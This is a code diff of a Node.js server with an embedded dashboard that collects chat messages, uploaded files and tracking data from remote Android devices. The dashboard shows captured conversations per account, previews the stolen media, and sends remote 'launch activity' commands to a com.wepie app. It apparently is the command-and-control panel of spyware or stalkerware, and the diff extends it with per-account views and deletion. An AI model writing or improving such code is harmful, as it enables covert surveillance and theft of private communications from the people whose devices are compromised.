+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
+@media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:42vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards{grid-template-columns:1fr 1fr}.content{padding:16px}}
+@media (max-width:520px){.cards,.commandbar{grid-template-columns:1fr}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
 </style>
 </head>
 <body>
@@ -526,44 +712,45 @@ button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:gri
     <div id="devices" class="devices"></div>
   </aside>
   <main class="main">
-    <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Device details, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
-    <div class="tabs"><button class="tab active" data-tab="info">Info</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
-    <div class="commandbar">
-      <input id="cmdTitle" placeholder="Menu title" value="MG Menu">
-      <input id="cmdText" placeholder="Text to show in app" value="Launch activity">
-      <select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option><option value="activity">activity</option><option value="open">open</option><option value="start_activity">start_activity</option><option value="launch_activity">launch_activity</option><option value="open_activity">open_activity</option><option value="toast">toast</option></select>
-      <input id="cmdActivity" placeholder="Activity class" value="com.wepie.module.teenmode.TeenModeOpeningActivity">
-      <button class="btn" id="sendCommand">Send</button>
-      <button class="btn danger" id="clearCommand">Clear</button>
-    </div>
+    <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
+    <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
+    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option><option value="toast">toast</option></select><input id="cmdActivity" value="com.wepie.module.teenmode.TeenModeOpeningActivity"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
     <section id="content" class="content"></section>
   </main>
 </div>
 <div id="modal" class="modal"><div class="modalbox"><div class="modalhead"><strong id="modalTitle"></strong><button class="btn" id="closeModal">Close</button></div><div id="modalBody" class="modalbody"></div></div></div>
 <script>
-const state={devices:[],selected:null,tab:"info",messages:[],files:[]};
+const state={devices:[],selected:null,account:null,accounts:[],tab:"overview",messages:[],files:[]};
 const $=id=>document.getElementById(id);
+const enc=encodeURIComponent;
 const fmtDate=v=>{if(!v)return "";const d=/^\\d+$/.test(String(v))?new Date(Number(v)):new Date(v);return Number.isFinite(d.getTime())?d.toLocaleString():String(v)};
 const fmtBytes=n=>{n=Number(n)||0;const u=["B","KB","MB","GB"];let i=0;while(n>=1024&&i<u.length-1){n/=1024;i++}return n.toFixed(i?1:0)+" "+u[i]};
 const esc=s=>String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 const isImg=f=>/\\.(png|jpe?g|gif|webp|svg)$/i.test(f||"");
 const isVid=f=>/\\.(mp4|webm|mov)$/i.test(f||"");
 async function api(url,opts){const r=await fetch(url,opts);if(!r.ok)throw new Error(await r.text());return r.json()}
-async function load(){state.devices=await api("/api/devices"); if(!state.selected&&state.devices[0]) state.selected=state.devices[0].device_id; renderDevices(); await loadSelected()}
-async function loadSelected(){if(!state.selected){renderEmpty();return} const [messages,files]=await Promise.all([api("/api/device/"+encodeURIComponent(state.selected)+"/messages"),api("/api/device/"+encodeURIComponent(state.selected)+"/files")]); state.messages=messages; state.files=files; renderMain()}
-function renderDevices(){const q=$("search").value.toLowerCase();const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));$("totalDevices").textContent=state.devices.length;$("onlineDevices").textContent=state.devices.filter(d=>d.online).length;$("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);$("devices").innerHTML=list.map(d=>'<button class="device '+(d.device_id===state.selected?'active':'')+'" data-id="'+esc(d.device_id)+'"><div class="devtop"><span class="dot '+(d.online?'on':'')+'"></span><span class="devname">'+esc(d.display_name||d.device_id)+'</span></div><div class="devmeta"><span>Files '+(d.file_count||0)+'</span><span>Chats '+(d.message_count||0)+'</span></div></button>').join("")||'<div class="empty">No devices found</div>'}
+async function load(){state.devices=await api("/api/devices");if(!state.selected&&state.devices[0])state.selected=state.devices[0].device_id;renderDevices();await loadSelected()}
+async function loadSelected(){if(!state.selected){renderEmpty();return}state.accounts=await api("/api/device/"+enc(state.selected)+"/accounts");if(!state.account||!state.accounts.find(a=>a.key===state.account))state.account=state.accounts[0]?.key||null;await loadAccount();renderMain()}
+async function loadAccount(){if(!state.selected||!state.account){state.messages=[];state.files=[];return}const base="/api/device/"+enc(state.selected)+"/account/"+enc(state.account);[state.messages,state.files]=await Promise.all([api(base+"/messages"),api(base+"/files")])}
 function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
+function selectedAccount(){return state.accounts.find(a=>a.key===state.account)}
+function renderDevices(){const q=$("search").value.toLowerCase();const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));$("totalDevices").textContent=state.devices.length;$("onlineDevices").textContent=state.devices.filter(d=>d.online).length;$("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);$("devices").innerHTML=list.map(d=>'<button class="device '+(d.device_id===state.selected?'active':'')+'" data-id="'+esc(d.device_id)+'"><div class="devtop"><span class="dot '+(d.online?'on':'')+'"></span><span class="devname">'+esc(d.display_name||d.device_id)+'</span></div><div class="devmeta"><span>Users '+(d.account_count||0)+'</span><span>Chats '+(d.message_count||0)+'</span><span>Files '+(d.file_count||0)+'</span></div></button>').join("")||'<div class="empty">No devices</div>'}
+function renderAccounts(){if(!state.accounts.length)return '<div class="empty">No accounts for this device yet</div>';return '<div class="accounts">'+state.accounts.map(a=>'<button class="account '+(a.key===state.account?'active':'')+'" data-account="'+esc(a.key)+'"><strong>'+esc(a.my_name||"Unknown account")+'</strong><span class="muted">Public ID: '+esc(a.public_id||"")+'</span><br><span class="muted">UID: '+esc(a.my_uid||"")+' • Chats '+(a.message_count||0)+' • Files '+(a.file_count||0)+'</span></button>').join("")+'</div>'}
 function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
-function renderMain(){const d=selectedDevice(); if(!d)return renderEmpty(); $("deviceTitle").textContent=d.display_name||d.device_id; $("deviceSub").textContent=(d.online?"Online":"Offline")+" • Last seen "+fmtDate(d.server_last_seen); document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab)); if(state.tab==="info")renderInfo(d); if(state.tab==="chats")renderChats(); if(state.tab==="files")renderFiles()}
-function renderInfo(d){$("content").innerHTML='<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Battery</span><b>'+(d.battery_percent??0)+'%</b></div><div class="card"><span>Files</span><b>'+state.files.length+'</b></div><div class="card"><span>Messages</span><b>'+state.messages.length+'</b></div></div><div class="info">'+["device_id","my_uid","public_id","my_name","brand","model","network_type","public_ip","server_last_seen","created_at"].map(k=>'<div class="row"><span>'+esc(k)+'</span><strong>'+esc(d[k]??"")+'</strong></div>').join("")+'</div>'}
-function renderChats(){if(!state.messages.length){$("content").innerHTML='<div class="empty">No messages for this device</div>';return} $("content").innerHTML='<div class="messages">'+state.messages.map(m=>'<div class="msg '+esc(m.direction)+'"><div class="msghead"><span>'+esc(m.direction||"")+' • '+esc(m.peer_name||m.peer_uid||"Unknown")+'</span><span>'+esc(fmtDate(m.received_at||m.message_time))+'</span></div><div>'+esc(m.text||"")+'</div></div>').join("")+'</div>'}
-function renderFiles(){if(!state.files.length){$("content").innerHTML='<div class="empty">No files for this device</div>';return} $("content").innerHTML='<div class="grid">'+state.files.map(f=>{const url="/uploads/"+encodeURIComponent(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename" title="'+esc(f.original||f.file)+'">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
-function openPreview(file){const url="/uploads/"+encodeURIComponent(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
-$("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;renderDevices();loadSelected()};
-$("search").oninput=renderDevices;$("refresh").onclick=load;document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
+function renderMain(){const d=selectedDevice();if(!d)return renderEmpty();const a=selectedAccount();$("deviceTitle").textContent=d.display_name||d.device_id;$("deviceSub").textContent=(d.online?"Online":"Offline")+" • "+(a?(a.my_name||a.public_id||"Unknown account"):"No account selected");document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab));if(state.tab==="overview")renderOverview(d,a);if(state.tab==="chats")renderChats();if(state.tab==="files")renderFiles()}
+function renderOverview(d,a){$("content").innerHTML=renderAccounts()+'<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Accounts</span><b>'+state.accounts.length+'</b></div><div class="card"><span>Selected chats</span><b>'+state.messages.length+'</b></div><div class="card"><span>Selected files</span><b>'+state.files.length+'</b></div></div><div class="toolbar"><button class="btn danger" id="deleteAccount">Delete selected user</button><button class="btn danger" id="deleteAccountChats">Delete user chats</button><button class="btn danger" id="deleteAccountFiles">Delete user files</button></div><br><div class="row"><span>Device ID</span><strong>'+esc(d.device_id)+'</strong></div><div class="row"><span>Public ID</span><strong>'+esc(a?.public_id||"")+'</strong></div><div class="row"><span>Name</span><strong>'+esc(a?.my_name||"")+'</strong></div><div class="row"><span>UID</span><strong>'+esc(a?.my_uid||"")+'</strong></div>'}
+function renderChats(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!state.messages.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="messages">'+state.messages.map(m=>'<div class="msg '+esc(m.direction)+'"><label class="checkline"><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"><span class="muted">Select</span></label><div class="msghead"><div><span class="sender-name">'+esc(m.peer_name||"Unknown")+'</span><span class="sender-id">Public ID: '+esc(m.peer_uid||"")+' • '+esc(m.direction||"")+'</span></div><span class="msgtime">'+esc(fmtDate(m.received_at||m.message_time))+'</span></div><div class="msgtext">'+esc(m.text||"")+'</div></div>').join("")+'</div>'}
+function renderFiles(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllFiles">Select all</button><button class="btn danger" id="deleteSelectedFiles">Delete selected</button><button class="btn danger" id="deleteAllFiles">Delete all user files</button></div><br>';if(!state.files.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No files for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="grid">'+state.files.map(f=>{const url="/uploads/"+enc(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><label class="checkline" style="padding:8px 10px 0"><input type="checkbox" class="filecheck" value="'+esc(f.file)+'"><span class="muted">Select</span></label><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete-file="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
+function openPreview(file){const url="/uploads/"+enc(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
+async function deletePath(path,msg){if(!confirm(msg))return;await api(path,{method:"DELETE"});await loadSelected();renderDevices()}
+async function deleteSelectedChats(){const ids=[...document.querySelectorAll(".msgcheck:checked")].map(x=>Number(x.value));if(!ids.length)return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});await loadSelected()}
+async function deleteSelectedFiles(){const files=[...document.querySelectorAll(".filecheck:checked")].map(x=>x.value);if(!files.length)return;await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files})});await loadSelected()}
+$("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;state.account=null;renderDevices();loadSelected()};
+$("search").oninput=renderDevices;$("refresh").onclick=load;$("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(state.selected),"Delete this device with all chats and files?");
+document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
+$("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;await loadAccount();renderMain();return}if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
 $("sendCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:$("cmdTitle").value,text:$("cmdText").value,action:$("cmdAction").value,activity:$("cmdActivity").value})});$("sendCommand").textContent="Sent";setTimeout(()=>$("sendCommand").textContent="Send",1200)};
-$("clearCommand").onclick=async()=>{$("cmdText").value="";$("cmdAction").value="none";$("cmdActivity").value="";await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
-$("content").onclick=async e=>{const p=e.target.closest("[data-preview]");if(p)openPreview(p.dataset.preview);const d=e.target.closest("[data-delete]");if(d&&confirm("Delete this file?")){await fetch("/api/file/"+encodeURIComponent(d.dataset.delete),{method:"DELETE"});await load()}};
+$("clearCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
 $("closeModal").onclick=()=>$("modal").classList.remove("open");$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
 load().catch(err=>{$("content").innerHTML='<div class="empty">Failed to load dashboard: '+esc(err.message)+'</div>'});
 </script>
@@ -571,36 +758,8 @@ load().catch(err=>{$("content").innerHTML='<div class="empty">Failed to load das
 </html>`;
 }
 
-async function handleDashboardApi(req, res, url) {
-  const parts = url.pathname.split("/").filter(Boolean).map(safeDecode);
-
-  if (url.pathname === "/api/devices") {
-    return json(res, 200, await devicesWithStats());
-  }
-
-  if (url.pathname === "/api/tracks") return json(res, 200, readTracks());
-
-  if (parts[0] === "api" && parts[1] === "device" && parts[2]) {
-    const deviceId = parts[2];
-    if (parts.length === 3) {
-      const devices = await devicesWithStats();
-      const device = devices.find((item) => item.device_id === deviceId);
-      return device ? json(res, 200, device) : notFound(res);
-    }
-    if (parts[3] === "messages") {
-      const devices = await getDevices();
-      return json(res, 200, await getMessagesForDeviceIds(findLinkedDeviceIds(devices, deviceId)));
-    }
-    if (parts[3] === "files") return json(res, 200, getFiles(deviceId));
-    if (parts[3] === "tracks") return json(res, 200, readTracks().filter((item) => item.device_id === deviceId));
-  }
-
-  return false;
-}
-
 async function handler(req, res) {
   const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
-
   if (req.method === "OPTIONS") {
     res.writeHead(204, {
       "access-control-allow-origin": "*",
@@ -617,22 +776,12 @@ async function handler(req, res) {
     if (req.method === "POST" && url.pathname === "/api/chat/batch") return await handleChatBatch(req, res);
     if (req.method === "POST" && url.pathname === "/track") return await handleTrack(req, res);
     if (req.method === "POST" && url.pathname === "/upload") return await handleUpload(req, res, url);
-
-    if (req.method === "GET" && url.pathname === "/api/files") {
-      const deviceId = clean(url.searchParams.get("device_id") || url.searchParams.get("id"));
-      return json(res, 200, getFiles(deviceId));
-    }
-
+    if (req.method === "GET" && url.pathname === "/api/files") return json(res, 200, getFiles(clean(url.searchParams.get("device_id") || url.searchParams.get("id"))));
     if (req.method === "GET" && url.pathname === "/api/all-files") return json(res, 200, getFiles());
     if (req.method === "GET" && url.pathname.startsWith("/uploads/")) return sendFile(res, UPLOAD_DIR, url.pathname.slice("/uploads/".length));
     if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) return sendFile(res, THUMB_DIR, url.pathname.slice("/thumbs/".length));
-    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) return handleDeleteFile(res, url.pathname.slice("/api/file/".length));
-
-    if (req.method === "GET" && url.pathname === "/api/debug") {
-      const [devices, messages] = await Promise.all([devicesWithStats(), getMessages()]);
-      return json(res, 200, { ok: true, devices, messages, files: getFiles(), tracks: readTracks(), command, config: readConfigFlag() });
-    }
-
+    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) return json(res, 200, { ok: true, deleted: deleteFilesByNames([url.pathname.slice("/api/file/".length)]) });
+    if (req.method === "GET" && url.pathname === "/api/debug") return json(res, 200, { ok: true, devices: await dashboardData(), messages: await getMessages(), files: getFiles(), accounts: readAccounts(), message_meta: readMessageMeta(), tracks: readTracks(), command, config: readConfigFlag() });
     if (req.method === "POST" && url.pathname === "/panel/command") {
       const body = await readJson(req);
       command = {
@@ -643,12 +792,10 @@ async function handler(req, res) {
       };
       return json(res, 200, { ok: true, command });
     }
-
     if (req.method === "GET" && url.pathname === "/api/data") return json(res, 200, command);
 
-    const dashboardHandled = req.method === "GET" ? await handleDashboardApi(req, res, url) : false;
-    if (dashboardHandled !== false) return;
-
+    const handled = await handleDashboardApi(req, res, url);
+    if (handled !== false) return;
     return notFound(res);
   } catch (error) {
     console.error(`${req.method} ${url.pathname}:`, error);
